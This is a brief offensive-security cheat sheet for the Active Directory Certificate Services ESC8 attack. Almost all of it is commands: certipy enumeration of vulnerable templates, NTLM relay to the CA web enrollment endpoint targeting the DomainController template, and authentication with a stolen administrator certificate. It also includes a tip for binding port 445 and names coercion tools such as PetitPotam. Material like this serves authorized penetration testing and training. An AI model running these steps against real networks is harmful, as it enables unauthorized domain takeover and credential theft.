# ADCS ESC8

%adcs, certificate, ActiveDirectory, template

## 1. Finding vulnerable template
```
certipy find -u <username> -p '<password>' -target <CA_FQDN> -vulnerable -stdout
```

## 2a. NTLM Relay (Relaying Domain Controller account)
```
certipy relay \
    -target 'https://<IP_ADDRESS>' -template 'DomainController'
```

## 2b. NTLM Relay (Relaying User account)
```
certipy relay -target 'https://<IP_ADDRESS>'
```

## Tip: If you get a 'permission denied' while trying to listen on port 445, you can use the command (on Linux): `echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start`

## 3. Coerce Authentication with other tool (Petitpotam, Coercer)

## 4. Certipy relays the authentication and requests a certificate

## 5. Authenticate
```
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```
